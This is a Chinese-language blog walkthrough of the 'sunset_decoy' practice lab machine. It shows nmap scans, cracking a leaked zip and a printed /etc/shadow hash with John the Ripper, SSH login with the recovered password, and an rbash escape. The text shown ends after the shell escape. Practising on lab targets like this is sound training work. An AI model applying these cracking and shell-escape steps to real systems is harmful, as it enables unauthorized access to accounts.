@@ -1,0 +1,755 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="sunset_decoy 靶机信息收集123456789101112┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.131 Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-07-19 08:10 EDTNmap scan report for 192.168.56.131">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sunset_decoy 靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/07/8964cc7f97f4.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="sunset_decoy 靶机信息收集123456789101112┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.131 Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-07-19 08:10 EDTNmap scan report for 192.168.56.131">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/ad723a35bbde6555be0000c8fd859f2e_MD5.png">
+<meta property="article:published_time" content="2023-07-20T08:28:21.000Z">
+<meta property="article:modified_time" content="2023-07-20T09:27:44.819Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/ad723a35bbde6555be0000c8fd859f2e_MD5.png">
+  
+  
+  
+  <title>sunset_decoy 靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="sunset_decoy 靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-07-20 16:28" pubdate>
+          2023年7月20日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          27k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          222 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">sunset_decoy 靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="sunset-decoy-靶机"><a href="#sunset-decoy-靶机" class="headerlink" title="sunset_decoy 靶机"></a>sunset_decoy 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.131 <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-19 08:10 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.131<br>Host is up (0.00062s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:0E:3C:2A (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.61 seconds<br></code></pre></td></tr></table></figure>
+
+<p>开放了 22 和 80 端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80 192.168.56.131<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-19 08:16 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.131<br>Host is up (0.00052s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 a9:b5:3e:3b:e3:74:e4:ff:b6:d5:9f:f1:81:e7:a4:4f (RSA)<br>|   256 ce:f3:b3:e7:0e:90:e2:64:ac:8d:87:0f:15:88:aa:5f (ECDSA)<br>|_  256 66:a9:80:91:f3:d8:4b:0a:69:b0:00:22:9f:3c:4c:5a (ED25519)<br>80/tcp open  http    Apache httpd 2.4.38<br>|_http-server-header: Apache/2.4.38 (Debian)<br>| http-ls: Volume /<br>| SIZE  TIME              FILENAME<br>| 3.0K  2020-07-07 16:36  save.zip<br>|_<br>|_http-title: Index of /<br>MAC Address: 08:00:27:0E:3C:2A (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.77 seconds<br></code></pre></td></tr></table></figure>
+
+<p>Debian 操作系统，80 端口下有个压缩文件，下载到本地查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ file save.zip                            <br>save.zip: Zip archive data, at least v2.0 to extract, compression method=deflate<br>┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ unzip -l save.zip <br>Archive:  save.zip<br>  Length      Date    Time    Name<br>---------  ---------- -----   ----<br>     1807  2020-06-27 18:05   etc/passwd<br>     1111  2020-07-07 16:26   etc/shadow<br>      829  2020-06-27 17:40   etc/group<br>      669  2020-02-02 02:41   etc/sudoers<br>      185  2020-06-27 16:58   etc/hosts<br>       33  2020-06-27 17:39   etc/hostname<br>---------                     -------<br>     4634                     6 files<br></code></pre></td></tr></table></figure>
+
+<h2 id="zip-压缩密码爆破"><a href="#zip-压缩密码爆破" class="headerlink" title="zip 压缩密码爆破"></a>zip 压缩密码爆破</h2><p>看起来是泄露了一些敏感文件，尝试解压，但是需要密码，那接下来就考虑如何爆破出解压密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ unzip save.zip   <br>Archive:  save.zip<br>[save.zip] etc/passwd password:<br></code></pre></td></tr></table></figure>
+
+<p>使用 zip2john 后续我们使用 john 进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ zip2john save.zip &gt; ziphash<br>ver 2.0 efh 5455 efh 7875 save.zip/etc/passwd PKZIP Encr: TS_chk, cmplen=668, decmplen=1807, crc=B3ACDAFE ts=90AB cs=90ab <span class="hljs-built_in">type</span>=8<br>ver 2.0 efh 5455 efh 7875 save.zip/etc/shadow PKZIP Encr: TS_chk, cmplen=434, decmplen=1111, crc=E11EC139 ts=834F cs=834f <span class="hljs-built_in">type</span>=8<br>ver 2.0 efh 5455 efh 7875 save.zip/etc/group PKZIP Encr: TS_chk, cmplen=460, decmplen=829, crc=A1F81C08 ts=8D07 cs=8d07 <span class="hljs-built_in">type</span>=8<br>ver 2.0 efh 5455 efh 7875 save.zip/etc/sudoers PKZIP Encr: TS_chk, cmplen=368, decmplen=669, crc=FF05389F ts=1535 cs=1535 <span class="hljs-built_in">type</span>=8<br>ver 2.0 efh 5455 efh 7875 save.zip/etc/hosts PKZIP Encr: TS_chk, cmplen=140, decmplen=185, crc=DFB905CD ts=8759 cs=8759 <span class="hljs-built_in">type</span>=8<br>ver 1.0 efh 5455 efh 7875 ** 2b ** save.zip/etc/hostname PKZIP Encr: TS_chk, cmplen=45, decmplen=33, crc=D9C379A9 ts=8CE8 cs=8ce8 <span class="hljs-built_in">type</span>=0<br>NOTE: It is assumed that all files <span class="hljs-keyword">in</span> each archive have the same password.<br>If that is not the <span class="hljs-keyword">case</span>, the <span class="hljs-built_in">hash</span> may be uncrackable. To avoid this, use<br>option -o to pick a file at a time.<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ <span class="hljs-built_in">ls</span><br>save.zip  ziphash<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ <span class="hljs-built_in">cat</span> ziphash                <br>save.zip:$pkzip<span class="hljs-variable">$6</span>*1*1*0*8*24*8759*a7409df1d7a76ad3809794d387209855bb7638aa589d5be62b9bf373d78055e1dd351925*1*0*8*24*1535*459926ee53809fa53fe26c3e4548cd7819791a638c8d96d3ec7cf18477ffa1e9e2e77944*1*0*8*24*834f*7d2cbe98180e5e9b8c31c5aec89c507011d26766981d17d249e5886e51ac03270b009d62*1*0*8*24*8d07*7d51a96d3e3fa4083bbfbe90ee97ddba1f39f769fcf1b2b6fd573fdca8c97dbec5bc9841*1*0*8*24*90ab*f7fe58aeaaa3c46c54524ee024bd38dae36f3110a07f1e7aba266acbf8b5ff0caf42e05e*2*0*2d*21*d9c379a9*9b9*46*0*2d*8ce8*aae40dfa55b72fd591a639c8c6d35b8cabd267f7edacb40a6ddf1285907b062c99ec6cc8b55d9f0027f553a44f*$/pkzip$::save.zip:etc/hostname, etc/hosts, etc/sudoers, etc/shadow, etc/group, etc/passwd:save.zip<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt ziphash<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (PKZIP [32/64])<br>Will run 4 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>manuel           (save.zip)     <br>1g 0:00:00:00 DONE (2023-07-19 08:36) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure>
+
+<p>得到了解压密码 <code>manuel</code>，解压文件后查看各个文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ unzip save.zip<br>Archive:  save.zip<br>[save.zip] etc/passwd password: <br>  inflating: etc/passwd              <br>  inflating: etc/shadow              <br>  inflating: etc/group               <br>  inflating: etc/sudoers             <br>  inflating: etc/hosts               <br> extracting: etc/hostname<br></code></pre></td></tr></table></figure>
+
+<p>优先查看 shadow 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ <span class="hljs-built_in">cd</span> etc                     <br>┌──(kali㉿kali)-[~/Downloads/sunset_decoy/etc]<br>└─$ <span class="hljs-built_in">cat</span> shadow    <br>root:$6$RucK3DjUUM8TjzYJ<span class="hljs-variable">$x2etp95bJSiZy6WoJmTd7UomydMfNjo97Heu8nAob9Tji4xzWSzeE0Z2NekZhsyCaA7y</span>/wbzI.2A2xIL/uXV9.:18450:0:99999:7:::<br>daemon:*:18440:0:99999:7:::<br>bin:*:18440:0:99999:7:::<br>sys:*:18440:0:99999:7:::<br><span class="hljs-built_in">sync</span>:*:18440:0:99999:7:::<br>games:*:18440:0:99999:7:::<br>man:*:18440:0:99999:7:::<br>lp:*:18440:0:99999:7:::<br>mail:*:18440:0:99999:7:::<br>news:*:18440:0:99999:7:::<br>uucp:*:18440:0:99999:7:::<br>proxy:*:18440:0:99999:7:::<br>www-data:*:18440:0:99999:7:::<br>backup:*:18440:0:99999:7:::<br>list:*:18440:0:99999:7:::<br>irc:*:18440:0:99999:7:::<br>gnats:*:18440:0:99999:7:::<br>nobody:*:18440:0:99999:7:::<br>_apt:*:18440:0:99999:7:::<br>systemd-timesync:*:18440:0:99999:7:::<br>systemd-network:*:18440:0:99999:7:::<br>systemd-resolve:*:18440:0:99999:7:::<br>messagebus:*:18440:0:99999:7:::<br>avahi-autoipd:*:18440:0:99999:7:::<br>sshd:*:18440:0:99999:7:::<br>avahi:*:18440:0:99999:7:::<br>saned:*:18440:0:99999:7:::<br>colord:*:18440:0:99999:7:::<br>hplip:*:18440:0:99999:7:::<br>systemd-coredump:!!:18440::::::<br>296640a3b825115a47b68fc44501c828:$6$x4sSRFte6R6BymAn<span class="hljs-variable">$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us</span>.:18450:0:99999:7:::<br></code></pre></td></tr></table></figure>
+
+<p>拿到了两个哈希，root 的哈希大概率不能直接碰撞，不然这台靶机的难度就太低了，不过我们依然可以在后面进行试错</p>
+<h2 id="shadow-文件爆破"><a href="#shadow-文件爆破" class="headerlink" title="shadow 文件爆破"></a>shadow 文件爆破</h2><p>这里优先爆破 <code>296640a3b825115a47b68fc44501c828</code> 用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_decoy/etc]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;root:$6$RucK3DjUUM8TjzYJ$x2etp95bJSiZy6WoJmTd7UomydMfNjo97Heu8nAob9Tji4xzWSzeE0Z2NekZhsyCaA7y/wbzI.2A2xIL/uXV9.:18450:0:99999:7:::&#x27;</span> &gt; roothash<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/sunset_decoy/etc]<br>└─$ <span class="hljs-built_in">mv</span> roothash ../<br><br><br>┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt passwdhash<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])<br>Cost 1 (iteration count) is 5000 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 4 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>server           (296640a3b825115a47b68fc44501c828)     <br>1g 0:00:00:05 DONE (2023-07-19 08:40) 0.1712g/s 2936p/s 2936c/s 2936C/s felton..Hunter<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure>
+
+<p>爆破得到了密码 <code>server</code> 。接下来就是 ssh 登录考虑收集内部信息和提权了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ ssh 296640a3b825115a47b68fc44501c828@192.168.56.131 <br>296640a3b825115a47b68fc44501c828@192.168.56.131 s password: <br>Linux 60832e9f188106ec5bcc4eb7709ce592 4.19.0-9-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Wed Jul 19 08:45:11 2023 from 192.168.56.106<br>-rbash: <span class="hljs-built_in">dircolors</span>: <span class="hljs-built_in">command</span> not found<br></code></pre></td></tr></table></figure>
+
+<p>又进入了 rbash 中</p>
+<h2 id="rbash-绕过"><a href="#rbash-绕过" class="headerlink" title="rbash 绕过"></a>rbash 绕过</h2><p>接下来尝试绕过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">ls</span><br>honeypot.decoy  honeypot.decoy.cpp  <span class="hljs-built_in">id</span>  ifconfig  <span class="hljs-built_in">ls</span>  <span class="hljs-built_in">mkdir</span>  ncal  SV-502  user.txt<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">whoami</span><br>-rbash: <span class="hljs-built_in">whoami</span>: <span class="hljs-built_in">command</span> not found<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">id</span><br>uid=1000(296640a3b825115a47b68fc44501c828) gid=1000(296640a3b825115a47b68fc44501c828) <span class="hljs-built_in">groups</span>=1000(296640a3b825115a47b68fc44501c828)<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ifconfig<br>-rbash: ifconfig: <span class="hljs-built_in">command</span> not found<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">export</span> <span class="hljs-variable">$PATH</span><br>-rbash: <span class="hljs-built_in">export</span>: `PATH:/home/296640a3b825115a47b68fc44501c828/<span class="hljs-string">&#x27;: not a valid identifier</span><br><span class="hljs-string"></span><br><span class="hljs-string">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ export $SHELL</span><br><span class="hljs-string">-rbash: export: `/bin/rbash&#x27;</span>: not a valid identifier<br><br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">cd</span><br>-rbash: <span class="hljs-built_in">cd</span>: restricted<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ /bin/sh<br>-rbash: /bin/sh: restricted: cannot specify `/<span class="hljs-string">&#x27; in command names</span><br></code></pre></td></tr></table></figure>
+
+<p>可以使用的命令很少，<code>/</code> 和 cd 命令也被禁止了，也没有明显的可以利用的别的命令和方法，那就在 ssh 登录的时候进行指定</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ ssh 296640a3b825115a47b68fc44501c828@192.168.56.131 -t <span class="hljs-string">&quot;bash --noprofile&quot;</span><br>296640a3b825115a47b68fc44501c828@192.168.56.131\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">bash: dircolors: command not found</span><br><span class="hljs-string">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ whoami</span><br><span class="hljs-string">bash: whoami: command not found</span><br></code></pre></td></tr></table></figure>
+
+<p>这里已经变成了 bash 找不到命令，我们写入新的环境变量</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">export</span> PATH=/bin/:/usr/bin:<span class="hljs-variable">$PATH</span><br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">whoami</span><br>296640a3b825115a47b68fc44501c828<br></code></pre></td></tr></table></figure>
+
